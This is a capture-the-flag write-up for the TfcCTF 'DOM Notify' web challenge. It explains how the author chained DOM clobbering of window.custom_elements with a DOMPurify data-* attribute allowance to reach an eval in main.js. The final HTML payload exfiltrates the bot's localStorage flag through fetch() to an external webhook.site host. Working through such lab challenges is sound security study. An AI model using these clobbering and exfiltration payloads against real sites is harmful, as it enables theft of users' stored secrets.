---
title: DOM Notify
summary: Notify him when you are ready.
tags: [TfcCTF, Web, DOM Clobbering]
date: 2025-08-31
showtoc: true
---

# DOM Notify

## Description

Notify him when you are ready.

Difficulty: Grandpa  
Author: Sagi

[Given files](/tfcctf/dom-notify/web-dom-notify.zip)

## Solution

Hadarios, a member of my team, asked me to try solving this challenge where he had found a DOM clobbering vulnerability.
Unfortunately, he didn’t tell me where, so I still had to find it and exploit it myself.

DOM clobbering is a technique in which we override JavaScript global variables and influence website behavior by injecting malicious HTML.

Despite already knowing the vulnerability class, I still needed to find:

* A DOM clobbering source: the input that allows injecting malicious HTML to clobber a global variable.
* A sink: a JavaScript function that uses the clobbered variable in a dangerous way.
* A gadget: the variable to clobber to exploit the sink.

The website is a simple note-taking application.

![index](/tfcctf/dom-notify/index.png)

After creating a note, we are redirected to a page displaying the new note, its ID, and a button to report it.

![index](/tfcctf/dom-notify/note.png)

As always, I immediately tried an XSS, but unfortunately it was sanitized.

Since the application didn’t offer any other visible features, I started digging into the source code.

Firstly, where is the flag?
It’s stored in the local storage of the bot, which only visits the `/note/:id` endpoint to read the submitted note.

```js
await page.goto(`${BASE_URL}/note/${id}`);
await page.evaluate((flag) => {
  localStorage.setItem("flag", flag);
}, FLAG);
```

Next, I wanted to check the sanitization function to see if it could be bypassed.
Unfortunately, DOMPurify is used, so I probably won’t find an XSS here.
Despite that, some HTML elements are still allowed, making the note content our DOM clobbering source.

```js
// Setup DOMPurify
const window = (new JSDOM('')).window;
const DOMPurify = createDOMPurify(window);

function sanitizeContent(content) {
    // Sanitize the note with DOMPurify
    content = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'div', 'span'],
        ALLOWED_ATTR: ['id', 'class', 'name', 'href', 'title']
    });

    // Make sure that no empty strings are left in the attribute values
    content = content.replace(/""/g, 'invalid-value');

    return content;
}

// Route: Handle form submission
app.post('/note/create', async (req, res) => {
  let { content } = req.body;

  content = sanitizeContent(content);

  // ...
});
```

After that, I reviewed the other endpoints, looking for any security issues.
That’s when I found an intriguing endpoint: `/custom-divs`.

```js
// Route: Return multiple custom elements as JSON
// !! At the moment the route seems to have some frontend errors, so we disabled it in the main.js
app.get('/custom-divs', (req, res) => {
    const customElements = [
      { name: 'fancy-div', observedAttribute: 'color' },
      { name: 'huge-div', observedAttribute: 'font' },
      { name: 'title-div', observedAttribute: 'title' }
    ];

    res.json(customElements);
});
```

It doesn’t do much, as it only returns JSON.
But the comments mention a `main.js` file, so I decided to take a look.

```js
// window.custom_elements.enabled = true;
const endpoint = window.custom_elements.endpoint || '/custom-divs';

async function fetchCustomElements() {
    console.log('Fetching elements');

    const response = await fetch(endpoint);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const customElements = await response.json();
    console.log('Custom Elements fetched:', customElements);

    return customElements;
}

function createElements(elements) {
    console.log('Registering elements');

    for (var element of elements) {
        // Registers a custom element
        console.log(element);
        customElements.define(element.name, class extends HTMLDivElement {
            static get observedAttributes() { 
                if (element.observedAttribute.includes('-')) {
                    return [element.observedAttribute]; 
                }

                return [];
            }

            attributeChangedCallback(name, oldValue, newValue) {
                // Log when attribute is changed
                eval(`console.log('Old value: ${oldValue}', 'New Value: ${newValue}')`);
            }
        }, { extends: 'div' });
    }
}

// When the DOM is loaded
document.addEventListener('DOMContentLoaded', async function () {
    const enabled = window.custom_elements.enabled || false;

    // Check if the custom div functionality is enabled
    if (enabled) {
        var customDivs = await fetchCustomElements();
        createElements(customDivs);
    }
});
```

This file is loaded in the browser when reading a note.
At first glance, it only defines new `div` elements.
But when inspecting the custom class, we see that `eval` is called when an attribute is changed:

```js
eval(`console.log('Old value: ${oldValue}', 'New Value: ${newValue}')`);
```

I just have two things to say:

* Why?
* It’s pretty clear that this `eval` is our sink.
Now we need to find how to trigger it.

Let’s break down what the script does:

* Once the page is loaded, it checks if the `custom_elements` feature is enabled.
* If it is, the script fetches the elements from the `custom_elements.endpoint`.
* For each element, a new class is created, which observes only attributes that contain a dash (`-`).
* When such an attribute changes, the `eval` is called to log the old and new values.

To exploit this `eval`, we need to clobber these two variables, our gadgets:

```js
window.custom_elements.enabled
window.custom_elements.endpoint
```

To clobber them, I used [DOMC Payload Generator](https://domclob.xyz/domc_payload_generator/) to generate the appropriate payloads.

The first one enables the `custom_elements` feature:

```html
<a id="custom_elements"></a><a id="custom_elements" name="enabled" href="true"></a>
```

The second one sets `custom_elements.endpoint` to a site I control:

```html
<a id="custom_elements"></a><a id="custom_elements" name="endpoint" href="https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977"></a>
```

The webhook is configured to serve the following JSON:

```json
[
  {
    "name": "my-custom-div",
    "observedAttribute": "my-attribute"
  }
]
```

This JSON will be fetched by `main.js` and used to create a new element `my-custom-div`, which observes the attribute `my-attribute`.
When it changes, the `eval` is triggered.

Let’s try to create a note using what we have so far, to see if the `eval` gets called.
My note contains the two clobbers and a custom `div`:

```html
<a id="custom_elements"></a><a id="custom_elements" name="enabled" href="true"></a>
<a id="custom_elements"></a><a id="custom_elements" name="endpoint" href="https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977"></a>
<div is="my-custom-div" my-attribute="helo"></div>
```

Thanks to the webhook receiving a request, I know that the clobber was successful.
Unfortunately, the `eval` didn’t get called.

Here’s how my payload was rendered on the note page after sanitization:

```html
<a id="custom_elements"></a><a href="true" name="enabled" id="custom_elements"></a>
<a id="custom_elements"></a><a href="https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977" name="endpoint" id="custom_elements"></a>
<div is=invalid-value></div>
```

Two things happened:

* The `is` attribute was cleared by DOMPurify, but because of the sanitization function, it has then be set to `invalid-value`.
To fix this, I updated the `div` name in the JSON to match.

* My custom attribute `my-attribute` was removed by DOMPurify.

Contrarly to `my-attribute`, the `is` attribute is still present after sanitization and was only cleared.
I initially thought that was because `my-attribute` was not a valid attribute, while `is` was.
So I searched for an existing attribute that contains a dash and found `data-*`.

I updated the JSON and note accordingly:

```json
[
  {
    "name": "invalid-value",
    "observedAttribute": "data-helo"
  }
]
````

```html
<a id="custom_elements"></a><a id="custom_elements" name="enabled" href="true"></a>
<a id="custom_elements"></a><a id="custom_elements" name="endpoint" href="https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977"></a>
<div is="invalid-value" data-helo="helo"></div>
````

This time, the custom attribute passed sanitization, and I reached the `eval`:

```
Old value: null New Value: helo
```

Now all I needed to do was update the `data-helo` value to break out of the `console.log` in the `eval` and run arbitrary code to exfiltrate the flag:

```js
console.log('Old value: null', 'New Value: '); fetch(`https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977?${localStorage.getItem('flag')}`); ('')
```

Here is my final DOM clobbering payload, which retrieves the flag from local storage and exfiltrates it via a webhook:

```html
<a id="custom_elements"></a><a id="custom_elements" name="enabled" href="true"></a>
<a id="custom_elements"></a><a id="custom_elements" name="endpoint" href="https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977"></a>
<div is="invalid-value" data-helo="'); fetch(`https://webhook.site/a4657150-2529-49e3-b51c-1091d4ec3977?${localStorage.getItem('flag')}`); ('"/>
```

```
TFCCTF{t0_1s_0r_n0t_to_1s}
```

## Notes

Interestingly, DOMPurify allowed the `data-helo` attribute, even though it wasn’t explicitly listed in `ALLOWED_ATTR`.

This is because DOMPurify allows `data-*` and `aria-*` attributes by default, controlled by the `ALLOW_DATA_ATTR` and `ALLOW_ARIA_ATTR` options.

> `data-*` / `aria-*` attributes are allowed by default and controlled by specifying `ALLOW_DATA_ATTR` / `ALLOW_ARIA_ATTR`.
>
> -- *DOMPurify: [Default TAGs ATTRIBUTEs allow list & blocklist](https://github.com/cure53/DOMPurify/wiki/Default-TAGs-ATTRIBUTEs-allow-list-&-blocklist#html-attributes)*

# References

- Payloads All The Things: [DOM Clobbering](https://swisskyrepo.github.io/PayloadsAllTheThings/DOM%20Clobbering/)
- DOMC: [Payload Generator](https://domclob.xyz/domc_payload_generator/)
